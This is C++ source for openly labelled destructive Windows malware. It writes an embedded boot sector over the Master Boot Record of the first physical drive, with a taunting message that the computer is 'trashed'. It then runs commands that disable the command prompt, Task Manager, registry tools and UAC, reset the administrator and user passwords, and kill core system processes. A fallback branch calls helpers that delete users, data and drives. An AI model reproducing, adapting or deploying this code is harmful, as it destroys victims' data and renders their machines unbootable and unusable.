#define _WIN32_WINNT 0x0500

#include <Windows.h>
#include <iostream>
#include <string>

#include "data.h"
#include "usr.h"

using namespace std;

// Tested on Windows 8.1. Compile with Visual Studio 2019. Using /O2, /Ot, C++17 and C17.
// This malware run best on Windows 8.1 and Windows 10

char MasterBootRecord[] = { 0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x0F, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
0xCD, 0x10, 0xC3, 0x46, 0x41, 0x54, 0x41, 0x4C, 0x3A, 0x20, 0x59, 0x4F, 0x55, 0x52, 0x20, 0x43,
0x4F, 0x4D, 0x50, 0x55, 0x54, 0x45, 0x52, 0x20, 0x49, 0x53, 0x20, 0x4E, 0x4F, 0x57, 0x20, 0x54,
0x52, 0x41, 0x53, 0x48, 0x45, 0x44, 0x2E, 0x20, 0x49, 0x54, 0x20, 0x57, 0x49, 0x4C, 0x4C, 0x20,
0x42, 0x45, 0x20, 0x56, 0x45, 0x52, 0x59, 0x20, 0x48, 0x41, 0x52, 0x44, 0x20, 0x54, 0x4F, 0x20,
0x52, 0x45, 0x53, 0x54, 0x4F, 0x52, 0x45, 0x2E, 0x20, 0x48, 0x41, 0x48, 0x41, 0x48, 0x41, 0x48,
0x41, 0x48, 0x41, 0x21, 0x21, 0x0D, 0x0A, 0x0D, 0x0A, 0x49, 0x4E, 0x46, 0x4F, 0x3A, 0x20, 0x53,
0x6F, 0x6D, 0x65, 0x6F, 0x6E, 0x65, 0x31, 0x36, 0x31, 0x31, 0x20, 0x69, 0x73, 0x20, 0x74, 0x68,
0x65, 0x20, 0x70, 0x65, 0x72, 0x73, 0x6F, 0x6E, 0x20, 0x77, 0x68, 0x6F, 0x20, 0x74, 0x72, 0x61,
0x73, 0x68, 0x65, 0x64, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x70, 0x63, 0x0D, 0x0A, 0x0D, 0x0A,
0x57, 0x68, 0x61, 0x74, 0x20, 0x68, 0x61, 0x70, 0x70, 0x65, 0x6E, 0x65, 0x64, 0x20, 0x74, 0x6F,
0x20, 0x6D, 0x79, 0x20, 0x64, 0x65, 0x76, 0x69, 0x63, 0x65, 0x3F, 0x0D, 0x0A, 0x59, 0x6F, 0x75,
0x72, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x6F,
0x76, 0x65, 0x72, 0x77, 0x72, 0x69, 0x74, 0x74, 0x65, 0x6E, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};

// The hex data of the bootloader's binary, include custom message

int main()
{
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    DWORD dwBytesWritten;

    ZeroMemory(&MasterBootRecord, (sizeof MasterBootRecord));
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

    // Create handle for overwrite MBR

    if (WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE) {
        // Overwrite MBR completed sucessful

        system("taskkill /f /im explorer.exe");
        spamusr();

        // What? We have killed the system! No, they can find it again with some powerful tools. We have to use the legacy system killer again,
        // except the delete data, because we have overwritten MBR, so we can't modify data on the disk.

        system("REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
        system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
        system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
        system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DisableCAD /t REG_DWORD /d 0 /f");
        system("net user Administrator Trashedpc001");
        system("net user %USERNAME% Trashedpc001");
        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");

        system("explorer.exe");

        system("taskkill /f /im svchost.exe");

        // Bye bye system, you die
    }
    else {
        // Overwrite MBR fail, using legacy system killer

        delusr();

        fetchdat();

        deldrvs();

        spamusr();

        system("REG ADD HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f");
        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
        system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoRun /t REG_DWORD /d 1 /f");
        system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f");
        system("REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DisableCAD /t REG_DWORD /d 0 /f");

        system("net user Administrator Trashedpc001");
        system("net user %USERNAME% Trashedpc001");

        system("explorer.exe");

        // Reaching target: Kill system

        system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        system("REG ADD HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
        system("taskkill /f /im svchost.exe");
    }
    CloseHandle(hDevice);

    return 0;
}
